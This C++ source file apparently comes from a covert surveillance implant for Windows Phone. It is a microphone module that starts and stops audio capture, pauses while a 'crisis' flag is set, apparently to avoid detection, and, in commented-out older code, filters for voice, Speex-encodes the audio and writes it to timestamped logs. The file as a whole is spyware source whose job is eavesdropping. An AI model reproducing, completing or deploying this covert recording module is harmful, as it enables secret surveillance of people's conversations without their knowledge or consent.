#include "Modules.h"
#include "Common.h"
#include "Module.h"

#include <mmsystem.h>
#include <exception>
/***
#include <winreg.h>
#include "CWaveForm.h"
#include "speex/speex.h"
#include "speex/speex_preprocess.h"
***/

#include "Conf.h"
#include "Microphone.h"
#include "Device.h"
#include "Log.h"

#include "FunctionFunc.h"

/***/ //provo ad aggiungere tutto quello che avevo sulla compilazione c++/CX per ovviare all'eccezzione

using namespace Windows::System;
//using namespace Windows::Foundation;

#include <wrl/client.h>
#include <ppl.h>
#include <ppltasks.h>
#include <memory>

#include <thread>
#include <chrono>


#include <windows.h>
#include <iostream>
#include <fstream>

//using namespace Windows::Phone::PersonalInformation;


/***/

#define DTTMFMT "%Y-%m-%d %H:%M:%S "
#define DTTMSZ 21


//#include "Native\NativeAudioInterface.h"
#include "NativeAudioInterface.h"
using namespace NativeAudioInterface::Native;

MicAdditionalData mad;
BOOL bMicIsrecording, bUpdateTimestamp;
INT vadThreshold;
BOOL vad;
DWORD dwMicBuffInCount;
WAVEHDR	tagMicWaveHdr[MIC_COUNT_BUFF];
///CWaveformIn *micAgent;

NativeCapture^ micAgent;

DWORD mic_buffer_len = MIC_DEF_BUFFER_LEN;
DWORD mic_compress_factor = MIC_DEF_COMPRESS_FACTOR; 

static char *getDtTm (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
    return buff;
}

/***
void MicSaveEncode(BYTE *wave, DWORD total_size) {

	short *bit_sample;
	void *state;
	float *input;
	BYTE *to_write;
	BYTE *source_ptr;
	BYTE *cbits;
///	SpeexBits bits;
	DWORD frame_size = 0;
	DWORD i, nbBytes;	
	DWORD complexity = 1;
	//DWORD vad = 1;
	//SpeexPreprocessState *preprocess;

	// Crea un nuovo encoder in wide mode
	state = speex_encoder_init(speex_lib_get_mode(SPEEX_MODEID_NB));
	speex_encoder_ctl(state, SPEEX_SET_QUALITY, &mic_compress_factor);
	speex_encoder_ctl(state, SPEEX_SET_COMPLEXITY, &complexity);
	//speex_encoder_ctl(state, SPEEX_SET_DTX, &vad); // Abilitiamo la trasmissione discontinua
	//speex_encoder_ctl(state, SPEEX_SET_VAD, &vad); // Abilitiamo il VAD
	speex_bits_init(&bits);
	speex_encoder_ctl(state, SPEEX_GET_FRAME_SIZE, &frame_size);

	//preprocess = speex_preprocess_state_init(frame_size, MIC_SAMPLE_RATE);
	//speex_preprocess_ctl(preprocess, SPEEX_PREPROCESS_SET_VAD, &vad); // Attiviamo il VAD

	if (!frame_size) {
		SPEEX_FREE;
		return;
	}

	// Allochiamo il buffer di output grande quanto quello originale (per sicurezza)
	if (!(to_write = new(std::nothrow) BYTE[frame_size*MIC_SAMPLE_SIZE])) {
		SPEEX_FREE;
		return;
	}
	cbits = to_write + sizeof(DWORD); // Punta al blocco dati, mentre la prima DWORD conterra' la dimensione

	// Allochiamo il buffer di elaborazione
	if (!(input = new(std::nothrow) FLOAT[frame_size])) {
		SAFE_DELETE(to_write);
		SPEEX_FREE;
		return;
	}

	// Se il VAD e' attivo
	if (vad) {
		// Controlliamo che ci sia voce nel campione
		SHORT sPrev = 0;
		UINT uZeroCross = 0;

		// wave -> wave + total_size in step di frame_Size * 2
		for (source_ptr=wave; source_ptr+(frame_size*MIC_SAMPLE_SIZE)<=wave+total_size; source_ptr+=(frame_size*MIC_SAMPLE_SIZE)) {
			// Copiamo i campioni a 16 bit dentro dei float
			bit_sample = (short *)source_ptr;

			for (i = 0; i < frame_size; i++) {
				if ((INT)(sPrev * bit_sample[i]) < 0)
					uZeroCross++;

				sPrev = bit_sample[i];
			}
		}

		FLOAT fCross = (float)(uZeroCross / (total_size / (frame_size * MIC_SAMPLE_SIZE)));

		// Se non c'e' voce, droppiamo il campione
		if (fCross >= (FLOAT)vadThreshold) {
			bUpdateTimestamp = TRUE; // Il prossimo loop dobbiamo aggiornare il timestamp
			SAFE_DELETE(to_write);
			SAFE_DELETE(input);
			SPEEX_FREE;
			return;
		}
	}

	Log log;

	// Se necessario aggiorniamo il timestamp
	if (bUpdateTimestamp) {
		unsigned __int64 temp_time = GetTime();

		mad.fId.dwHighDateTime = (DWORD)((temp_time & 0xffffffff00000000) >> 32);
		mad.fId.dwLowDateTime  = (DWORD)(temp_time & 0x00000000ffffffff);

		bUpdateTimestamp = FALSE;
	}

	if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad, sizeof(mad), MMC1) == FALSE) {
		SAFE_DELETE(to_write);
		SAFE_DELETE(input);
		SPEEX_FREE;
		return;
	}

	// Continua finche' dopo source_ptr non rimane ancora spazio per un frame intero
	for (source_ptr=wave; source_ptr + (frame_size * MIC_SAMPLE_SIZE) <= wave + total_size; source_ptr += (frame_size * MIC_SAMPLE_SIZE)) {
		// Copiamo i campioni a 16 bit dentro dei float
		bit_sample = (short *)source_ptr;

		for (i=0; i<frame_size; i++)
			input[i] =  bit_sample[i];

		speex_bits_reset(&bits);
		speex_encode(state, input, &bits);

		// Encoda dentro il buffer di output
		nbBytes = speex_bits_write(&bits, (char *)cbits, frame_size * MIC_SAMPLE_SIZE);

		if (nbBytes > (frame_size * MIC_SAMPLE_SIZE))
			continue; // Check paranoico

		// Copia la lunghezza nei primi 4 byte per fare un'unica scrittura su file
		CopyMemory(to_write, &nbBytes, sizeof(DWORD)); 
		log.WriteLog(to_write, nbBytes + sizeof(DWORD));
	}

	log.CloseLog();
	SAFE_DELETE(to_write);
	SAFE_DELETE(input);
	SPEEX_FREE;
	
}
***/
/***
void CALLBACK MicwaveInProc(HWAVEIN hwi, UINT uMsg, DWORD dwInstance, WAVEHDR *dwParam1, DWORD dwParam2) {

	if (uMsg == MM_WIM_DATA) {
		if (dwParam1->dwBytesRecorded > 0)
			MicSaveEncode((BYTE *)dwParam1->lpData, dwParam1->dwBytesRecorded);

		if (bMicIsrecording) {
			waveInUnprepareHeader(hwi, dwParam1, sizeof(WAVEHDR));

			dwParam1->dwFlags = 0;
			dwParam1->dwBytesRecorded = 0;
			waveInPrepareHeader(hwi, dwParam1, sizeof(WAVEHDR));
			waveInAddBuffer(hwi, dwParam1, sizeof(WAVEHDR));
		} else {
			dwMicBuffInCount++;	
		}
	}
	
}
***/
BOOL MicRecordStop() {
	char buff[DTTMSZ];
   	getDtTm(buff);
	WCHAR msg[128];
	const size_t cSize = strlen(buff)+1;
    wchar_t* wc = new wchar_t[cSize];
    mbstowcs (wc, buff, cSize);
	swprintf_s(msg, L">>> %s: micAgent->StopCapture\n",wc);OutputDebugString(msg);

	micAgent->StopCapture();
	micAgent=nullptr;

/***
	if (micAgent == NULL)
		return FALSE;

	bMicIsrecording = FALSE;
	micAgent->Reset();

	// Aspetta che abbia flushato i buffer
	while(dwMicBuffInCount < MIC_COUNT_BUFF)
		Sleep(500);

	micAgent->Close();
	for (int j=0; j<MIC_COUNT_BUFF; j++) {
		micAgent->UnprepareHeader(&(tagMicWaveHdr[j]), sizeof(WAVEHDR));
		SAFE_FREE(tagMicWaveHdr[j].lpData);
	}
	delete micAgent;
	micAgent = NULL;
***/
	return TRUE;
}


BOOL MicRecordStart() {
	char buff[DTTMSZ];
   	getDtTm(buff);
	WCHAR msg[128];
	const size_t cSize = strlen(buff)+1;
    wchar_t* wc = new wchar_t[cSize];
    mbstowcs (wc, buff, cSize);
	swprintf_s(msg, L">>> %s: micAgent->StartCapture\n",wc);OutputDebugString(msg);


	micAgent->StartCapture();
/***
	WAVEFORMATEX in_pcmWaveFormat;
	CWaveform wave;
	UINT count = CWaveform::InGetNumDevs();

	dwMicBuffInCount = 0;

	for (UINT i = 0; i < count && micAgent == NULL; i++) {
		WAVEINCAPS wic;

		CWaveform::InGetDevCaps(i, &wic, sizeof(WAVEINCAPS));
		if (wic.dwFormats & WAVE_FORMAT_1M16) {
			ZeroMemory(&in_pcmWaveFormat, sizeof(WAVEFORMATEX));
			CWaveform::PrepareWaveFormat(&in_pcmWaveFormat, WAVE_FORMAT_PCM, 1, MIC_SAMPLE_RATE, 16);
			micAgent = wave.InOpen(i, &in_pcmWaveFormat, (DWORD_PTR) MicwaveInProc, 0, CALLBACK_FUNCTION);
		}
	}

	if (micAgent == NULL) 
		return FALSE;

	ZeroMemory(tagMicWaveHdr, sizeof(tagMicWaveHdr));
	for (UINT j = 0; j < MIC_COUNT_BUFF; j++) {
		tagMicWaveHdr[j].dwBufferLength = mic_buffer_len;
		tagMicWaveHdr[j].dwLoops = 1;
		// Alloca i buffer di registrazione e li prepara
		if (!(tagMicWaveHdr[j].lpData = (char *)new(std::nothrow) CHAR[tagMicWaveHdr[j].dwBufferLength]))  {
			for (UINT k = 0; k < j; k++) {
				SAFE_DELETE(tagMicWaveHdr[k].lpData);
			}

			micAgent->Close();
			delete micAgent;
			micAgent = NULL;
			return FALSE;
		}
	}

	for (UINT j = 0; j < MIC_COUNT_BUFF; j++) { 
		micAgent->PrepareHeader(&(tagMicWaveHdr[j]), sizeof(WAVEHDR));
		micAgent->AddBuffer(&(tagMicWaveHdr[j]), sizeof(WAVEHDR));
	}

	bMicIsrecording = TRUE;
	micAgent->Start();
***/
	return TRUE;
}

DWORD WINAPI RecordedMicrophone(LPVOID lpParam) {
	Module *me = (Module *)lpParam;
	Configuration *conf = me->getConf();
	HANDLE eventHandle;
	Device *deviceObj = Device::self();
	Status *statusObj = Status::self();

	BOOL bCrisis = FALSE;

	char buff[DTTMSZ];
   	getDtTm(buff);
	WCHAR msg[128];
	const size_t cSize = strlen(buff)+1;
    wchar_t* wc = new wchar_t[cSize];
    mbstowcs (wc, buff, cSize);
	swprintf_s(msg, L">>> %s:  micAgent ref new NativeCapture()\n",wc);OutputDebugString(msg);


	micAgent = ref new NativeCapture();

	bMicIsrecording = FALSE;
	///micAgent = NULL;
	
	try {
		vadThreshold = 50; //conf->getDouble(L"threshold");
	} catch (...) {
		vadThreshold = 50;
	}

	try {
		vad = conf->getBool(L"vad");
	} catch (...) {
		vad = FALSE;
	}

	me->setStatus(MODULE_RUNNING);
	eventHandle = me->getEvent();

	DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module started\n", 5, FALSE);

	unsigned __int64 temp_time = GetTime();

	ZeroMemory(&mad, sizeof(mad));
	mad.uVersion = MIC_LOG_VERSION;
	mad.uSampleRate = MIC_SAMPLE_RATE | LOG_AUDIO_CODEC_SPEEX;
	mad.fId.dwHighDateTime = (DWORD)((temp_time & 0xffffffff00000000) >> 32);
	mad.fId.dwLowDateTime  = (DWORD)(temp_time & 0x00000000ffffffff);
	bUpdateTimestamp = FALSE; // TRUE solo se passiamo dal silenzio alla voce

	///deviceObj->SetMicPowerState();
	
	MicRecordStart();

	LOOP {
		while (bCrisis) {
			DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module is in crisis\n", 6, FALSE);

			_WaitForSingleObject(eventHandle, 10000);

			if (me->shouldStop()) {
				DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module clean stop while in crisis [0]\n", 5, FALSE);
				me->setStatus(MODULE_STOPPED);
				return 0;
			}

			// Se la crisi e' finita...
			if ((statusObj->Crisis() & CRISIS_MIC) != CRISIS_MIC) {
				bCrisis = FALSE;

				///deviceObj->SetMicPowerState();
				MicRecordStart();

				DBG_TRACE(L"Debug - Microphone.cpp - RecordedMicrophoneAgent leaving crisis\n", 6, FALSE);
			}
		}

		_WaitForSingleObject(eventHandle, 10000);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module clean stop\n", 5, FALSE);

			MicRecordStop();
			///deviceObj->ReleaseMicPowerState();
			me->setStatus(MODULE_STOPPED);
			return 0;
		}

		if ((statusObj->Crisis() & CRISIS_MIC) == CRISIS_MIC) {
			bCrisis = TRUE;

			MicRecordStop();
			///deviceObj->ReleaseMicPowerState();
		}
	}

	return 0;
}